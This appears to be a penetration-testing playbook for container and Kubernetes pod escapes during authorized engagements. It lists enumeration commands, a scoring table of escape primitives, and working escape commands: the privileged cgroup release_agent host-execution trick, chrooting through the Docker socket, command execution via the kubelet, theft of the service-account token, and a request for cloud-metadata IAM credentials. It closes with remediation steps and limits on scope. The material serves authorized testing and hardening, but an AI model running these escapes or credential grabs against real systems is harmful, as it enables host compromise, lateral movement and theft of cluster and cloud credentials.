# Container escape methodology

## Purpose

Systematic container and Kubernetes pod escape methodology for authorized engagements. Given shell access inside a container, enumerate posture, identify escape primitives, and demonstrate impact with minimum necessary action.

## Phase 1 — Container posture enumeration (read-only)

```bash
# Identity and runtime
id; uname -a; cat /etc/os-release; cat /proc/1/cgroup
ls -la /.dockerenv 2>/dev/null; ls -la /run/.containerenv 2>/dev/null

# Capabilities
capsh --print
grep Cap /proc/self/status

# AppArmor / SELinux / Seccomp
cat /proc/self/attr/current 2>/dev/null
grep Seccomp /proc/self/status

# Mounts (look for host paths, docker.sock, /proc, /sys)
mount | column -t
cat /proc/self/mountinfo

# Devices
ls -la /dev

# Processes (hostPID = full host ps visible)
ps -ef | head -50

# Network (hostNetwork = host interfaces visible)
ip a; ip r; ss -tulnp 2>/dev/null

# Env (often leaks DB creds, cloud creds, API keys)
env | sort

# Secrets in common locations
ls -la /var/run/secrets/ 2>/dev/null
find / -name '*.kubeconfig' 2>/dev/null
find / -name 'credentials' 2>/dev/null
```

## Phase 2 — Escape surface scoring

| Primitive | Found if... | Escape difficulty |
|---|---|---|
| `--privileged` | `CapEff: 0000003fffffffff`, all caps | Trivial |
| `CAP_SYS_ADMIN` | in capsh output | Easy (cgroup release_agent, mount) |
| `CAP_SYS_PTRACE` + hostPID | host processes visible, ptrace allowed | Easy |
| `CAP_SYS_MODULE` | rare, very dangerous | Trivial (load kmod) |
| `CAP_DAC_READ_SEARCH` | | Read any file on host |
| Docker socket mounted | `/var/run/docker.sock` in mounts | Trivial |
| containerd socket | `/run/containerd/containerd.sock` | Trivial |
| `hostPath: /` mount | host root in mounts | Trivial |
| `hostPath: /var/log` | symlink-out tricks | Moderate |
| `hostPID: true` | host PIDs visible | Lateral via ptrace |
| `hostNetwork: true` | host NICs visible | Lateral, sniff, kubelet on `:10250` |
| Kernel CVE | uname check | Varies |

## Phase 3 — Common escape techniques

### Privileged + cgroup v1 release_agent

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd; echo 'ps -ef > /tmp/host_ps' >> /cmd; chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Docker socket

```bash
docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine chroot /host id
```

### hostPath / mount

```bash
chroot /host-root /bin/bash   # if / is mounted at /host-root
```

### Kubelet on hostNetwork (port 10250)

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk -XPOST "https://127.0.0.1:10250/run/<ns>/<pod>/<container>" -d 'cmd=id'
```

### K8s service account pivot

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods

# What can this SA do?
kubectl auth can-i --list --token=$TOKEN
```

Look for: `create pods`, `create pods/exec`, `get secrets`, `create clusterrolebindings`, `escalate`, `bind`, `impersonate`, `*` on `*`.

### Cloud metadata pivot (from node)

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Node IAM roles in EKS/GKE/AKS are often over-permissive. Stop at proof — do not enumerate the whole AWS account.

## Tools

`amicontained`, `deepce`, `cdk`, `botb`, `peirates`, `kubehound`, `kube-hunter`, `kubeaudit`. Manual `bash` + `curl` works for most checks.

## Output format

For each escape:
- **Primitive used** (privileged, capability, socket, hostPath, CVE).
- **Reproduction**: exact commands run in-container with output.
- **Blast radius**: own pod / node / namespace / cluster / cloud account.
- **Affected workloads**: enumerated only to the extent needed to prove blast radius.
- **Remediation**: PSA/PSS baseline or restricted, drop capabilities, no hostPath, no hostPID/Network, OPA/Kyverno policies, per-pod SA with least privilege, IRSA / Workload Identity for cloud creds.

## Safety

The minute you have proof, stop. Don't deploy DaemonSets, don't read every secret in the cluster, don't touch other tenants' pods. Restore any test artifacts (test pods, configmaps) before ending the session.
